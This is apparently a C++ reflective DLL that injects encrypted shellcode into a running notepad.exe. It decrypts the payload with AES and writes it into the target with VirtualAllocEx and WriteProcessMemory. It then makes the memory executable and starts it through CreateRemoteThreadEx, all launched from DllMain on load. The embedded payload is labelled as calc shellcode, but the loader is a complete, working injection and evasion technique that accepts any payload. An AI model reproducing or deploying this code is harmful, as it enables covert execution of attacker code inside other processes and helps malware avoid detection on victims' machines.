#include "ReflectiveLoader.h" // add reflective loader headers

#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <TlHelp32.h>
#include <string>


typedef BOOL(WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
    );

typedef LPVOID(WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
    );

typedef BOOL(WINAPI* pfnVirtualProtectEx)(
    IN  HANDLE hProcess,
    IN  LPVOID lpAddress,
    IN  SIZE_T dwSize,
    IN  DWORD  flNewProtect,
    OUT PDWORD lpflOldProtect
);

typedef HANDLE(WINAPI* pfnCreateRemoteThreadEx)(
    IN            HANDLE                        hProcess,
    IN OPTIONAL   LPSECURITY_ATTRIBUTES         lpThreadAttributes,
    IN            SIZE_T                        dwStackSize,
    IN            LPTHREAD_START_ROUTINE        lpStartAddress,
    IN OPTIONAL   LPVOID                        lpParameter,
    IN            DWORD                         dwCreationFlags,
    IN OPTIONAL   LPPROC_THREAD_ATTRIBUTE_LIST  lpAttributeList,
    OUT OPTIONAL  LPDWORD                       lpThreadId
);

typedef HANDLE(WINAPI* pfnCreateThread)(
    IN OPTIONAL   LPSECURITY_ATTRIBUTES    lpThreadAttributes,
    IN            SIZE_T                   dwStackSize,
    IN            LPTHREAD_START_ROUTINE   lpStartAddress,
    IN OPTIONAL   __drv_aliasesMem LPVOID  lpParameter,
    IN            DWORD                    dwCreationFlags,
    OUT OPTIONAL  LPDWORD                  lpThreadId
);

// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))       { return -1; }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))                                { return -1; }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0))                                { return -1; }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))                              { return -1; }
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len))  { return -1; }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

// calc shellcode (exitThread) - 64-bit
unsigned char payload[] = { 0x7, 0x26, 0xd8, 0x8e, 0xb8, 0x78, 0xf9, 0x78, 0x84, 0x3c, 0x0, 0xa8, 0x5b, 0xa, 0x6a, 0xe2, 0xc9, 0x6d, 0x63, 0x8b, 0x87, 0x9e, 0x80, 0xb5, 0x16, 0xc5, 0xa5, 0xc7, 0xda, 0x44, 0x1d, 0x2d, 0xae, 0x48, 0x2c, 0xb1, 0xc8, 0x92, 0xf5, 0xbc, 0xf5, 0xb8, 0xe6, 0xda, 0x9, 0x3c, 0x85, 0x9e, 0xac, 0xfa, 0x4c, 0xce, 0xa4, 0x35, 0x0, 0xdc, 0x50, 0x6b, 0x36, 0xb7, 0x5c, 0xfb, 0x12, 0xf1, 0x52, 0x46, 0x5b, 0x15, 0x3, 0x7d, 0x7b, 0x4e, 0x8d, 0x71, 0xf5, 0x7c, 0x43, 0x87, 0x46, 0x54, 0x64, 0xf9, 0x75, 0xab, 0x65, 0xb0, 0xbf, 0x9b, 0xc3, 0xd2, 0x3a, 0x73, 0xfc, 0xe3, 0x35, 0xe1, 0x23, 0x5d, 0x29, 0xe5, 0x10, 0xe2, 0x72, 0xef, 0xa9, 0x25, 0xa, 0x5a, 0x1f, 0x8e, 0xf7, 0xa5, 0xd8, 0x8b, 0x16, 0x33, 0xcf, 0x91, 0xde, 0x17, 0x79, 0x6, 0x5f, 0xd9, 0x61, 0x2c, 0x6a, 0x90, 0x7a, 0xaf, 0xb3, 0xdd, 0x1e, 0x0, 0xe3, 0xf3, 0x70, 0x5, 0x7a, 0x6d, 0x42, 0x7f, 0xb2, 0xc, 0xe0, 0xa2, 0xce, 0x3b, 0x1f, 0xa3, 0xf5, 0xcf, 0xa9, 0x1f, 0x3a, 0xf7, 0xab, 0x3, 0xf3, 0x36, 0xf2, 0x86, 0xf4, 0x4f, 0x20, 0x4a, 0xaa, 0x6a, 0x1c, 0xae, 0xe0, 0x13, 0x29, 0xe3, 0xb7, 0x84, 0xd8, 0x9b, 0xbc, 0x2f, 0xa6, 0xb2, 0x5f, 0xdc, 0x3b, 0x1, 0x70, 0x16, 0x61, 0x4c, 0xee, 0x42, 0x69, 0xf6, 0x1, 0x87, 0x76, 0x2f, 0x84, 0x14, 0x38, 0xd3, 0xa6, 0xe0, 0x25, 0x57, 0xa0, 0x7e, 0x4c, 0x1c, 0x6, 0xf, 0xae, 0x29, 0x92, 0x10, 0x3f, 0x5a, 0xff, 0x1d, 0x57, 0x67, 0x18, 0xba, 0x67, 0xb1, 0x7d, 0x9a, 0x6f, 0x48, 0xa3, 0x23, 0x23, 0x12, 0x62, 0xe3, 0x8b, 0xfb, 0x3e, 0x63, 0x9, 0xd0, 0x1d, 0xf8, 0xb0, 0xf6, 0x9c, 0x94, 0xd4, 0xb3, 0x2b, 0xfe, 0xe, 0xbb, 0x98, 0x65, 0xcf, 0x29, 0x39, 0xf8, 0x74, 0x3b, 0x9d, 0x24, 0xc2, 0xc, 0xa4, 0xdf, 0x7e, 0x4, 0xfd, 0xf9, 0x11, 0xc5, 0x36, 0xc6, 0xb5, 0x27, 0xd, 0x16, 0xa9, 0xe, 0xe3, 0x9, 0x65, 0xfb, 0xa5, 0xa3 };
unsigned char key[] = { 0xaf, 0x86, 0x80, 0xd4, 0x5e, 0xa3, 0xae, 0x79, 0xa9, 0x92, 0x38, 0xbe, 0x79, 0x8a, 0x9c, 0x41 };
SIZE_T scSize = sizeof(payload);

// Define NT imports
// ------------------------------------------------------------------------------------------------------------
pfnVirtualAllocEx       pVirtualAllocEx             =     (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
pfnWriteProcessMemory   pWriteProcessMemory         =     (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
pfnVirtualProtectEx     pVirtualProtectEx           =     (pfnVirtualProtectEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualProtectEx");
pfnCreateRemoteThreadEx pCreateRemoteThreadEx       =     (pfnCreateRemoteThreadEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateRemoteThreadEx");
pfnCreateThread         pCreateThread               =     (pfnCreateThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateThread");
// ------------------------------------------------------------------------------------------------------------
void _exec() {

    DWORD oldProtect = NULL;
    HANDLE cThread = NULL;
    BOOL wProcessMem;
    PVOID vAlloc = NULL;

    HANDLE hProcess = NULL;

    // change process
    auto procPid = FindProcessId(L"notepad.exe");
    if (!procPid) return;

    // Grab a handle of the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procPid);
    if (!hProcess) return;

    // Allocate memory in the remote process
    vAlloc = pVirtualAllocEx(hProcess, 0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (vAlloc == NULL) {
        return;
    }
    else
    {
        // Do decryption of shellcode before moving
        AESDecrypt((char*)payload, (unsigned int)scSize, (char*)key, sizeof(key));
        Sleep(2000);
    }

    // Write shellcode in remote process
    wProcessMem = pWriteProcessMemory(hProcess, vAlloc, payload, scSize, nullptr);
    if (wProcessMem == FALSE) { return; }

    // Change memory page protection so to execute the shellcode
    if (!pVirtualProtectEx(hProcess, vAlloc, scSize, PAGE_EXECUTE_READ, &oldProtect)) { return; } 

    // Start a new thread with shellcode
    cThread = pCreateRemoteThreadEx(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)vAlloc, NULL, 0, NULL, NULL);
    if (!cThread) { return; }

}

extern "C" HINSTANCE hAppInstance;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
    switch (dwReason)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)_exec, 0, 0, 0);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}